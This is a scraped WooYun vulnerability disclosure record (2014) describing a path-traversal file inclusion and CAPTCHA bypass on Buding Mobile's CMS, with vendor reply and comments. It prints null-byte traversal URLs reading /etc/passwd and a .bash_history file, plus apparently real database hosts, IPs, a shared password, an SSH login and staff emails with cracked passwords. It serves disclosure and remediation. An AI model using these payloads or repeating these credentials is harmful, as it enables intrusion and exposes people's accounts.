{"id": 49462, "wybug_id": "wooyun-2014-083516", "wybug_title": "布丁移动任意文件包含|验证码绕过(可获取153万用户密码，已入后台)", "wybug_corp": "创新工场", "wybug_author": "lijiejie", "wybug_date": "2014-11-16 20:44", "wybug_open_date": "2014-11-21 20:46", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 布丁移动一处任意文件包含，验证码可绕过。已进入后台。可远程连接MySQL(成功4台)，泄漏带密文MD5 Hash的用户数据153万。有手机号，密码，IMEI，MAC等信息。  详细说明：  任意文件包含位于：\nhttp://edit.buding.cn/cms/enter.php?product=../../../../../../../../../../etc/passwd%00.jpg\n非root，无法读shadow。首先尝试收集用户名，找到：\nrootopertransferluozhaoboluoxianlixiaofengrenfeiwangchunpengyangyujllbaojuqiangyuchenhezhengchenbingyumuninzhouweidatabackupgitejbcagaoleiwangdonghekunmingwangjunmartin\n作为基本思路，收集了用户名列表就可以去破解邮箱了。因为非root权限，而且是“文件包含”漏洞，所以读php文件中的配置是存在一些困难的。我逐个用户测试能否读.bash_history文件。功夫不负有心人呐，找到了有权限的用户：\nhttp://edit.buding.cn/cms/enter.php?product=../../../../../../../../../..//home/yangyu/.bash_history%00.jpg\n该文件记录了大量敏感信息，运维人员安全意识还不够。。。   漏洞证明：  MySQL数据库：\nhost = '58.68.234.22', user = 'yangyu', passwd = 'netjava', db = 'martin', charset = 'utf8'host = '118.192.93.138', port = 3308, db = 'martin',user = 'yangyu', passwd = 'netjava', charset = 'utf8'    可远程连接host = '223.202.2.206',user = 'yangyu', passwd = 'netjava', db = 'vcar_sumrise', charset = 'utf8'    可远程连接ssh -p11528 yangyu@223.202.2.37    可远程连接58.68.234.20  可远程连接\n通用密码。。。 连接成功了4台MySQL Server。\n\n153万用户，有密文：\n\n应该是公司所有的人吧：\n\n我试着插入一个aaa@buding.cn 123456，发现无法登录cms这个后台。基本确定有salt。 然而，后台验证码可绕过进行暴力破解（一次校验后不过期）。破解出来几枚：\nhaolu@buding.cn\t000000test@buding.cn\t000000yangyang@buding.cn\tyangyangwangjing@buding.cn\twangjingwangdong@buding.cn\twangdong\n超级管理员：\n\n\n\n后台功能未一一测试了。 ssh也未暴力破解。后续深入渗透是个体力活，就到这里吧。  :)   修复方案：  1. 参数过滤，解决任意文件包含2. 验证码使用一次之后必须过期   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-21 20:46 厂商回复：  最新状态： 2014-11-21：真的很抱歉，没有为作者评级上。漏洞已经转交给布丁项目的同学。危害等级是高，哎，真的对不住这位同学，我已经准备去HR领表了，希望得到你的原谅。。。  ", "replys": "漏洞评价：\n评论\n     2014-11-21 20:49 |    \t\tg0odnight \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:19        | 么么哒，呵呵哒，么蛤蛤~)\t\t \n  无影响666666    \n     2014-11-21 21:41 |    \t\tlijiejie  \t\t\t( 核心白帽子 |\t\t\t        Rank:2210 漏洞数:294        | Just for fun.)\t\t \n  @创新工场   无需太自责，及时处理了漏洞就好。 我了解到的情况是wooyun有短信通知，估计你们填写的号码失效了，所以没收到短信。  Mail的话，如果是公共邮箱，不转发到个人邮件，没看到也属正常。 :)      \n     2014-11-21 21:52 |    \t\tg0odnight \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:19        | 么么哒，呵呵哒，么蛤蛤~)\t\t \n  @lijiejie 弱弱问下，这个是布丁的app引起的还是web？厂商貌似把服务关了啊.....    \n     2014-11-22 12:12 |    \t\tlijiejie  \t\t\t( 核心白帽子 |\t\t\t        Rank:2210 漏洞数:294        | Just for fun.)\t\t \n  @g0odnight 既然已经通知到了那肯定得先关了，处理修复后再上线。   这个是web的    \n     2014-11-22 23:07 |    \t\t狮子找女友 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | life in security)\t\t \n  netjava是怎么知道的呢    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}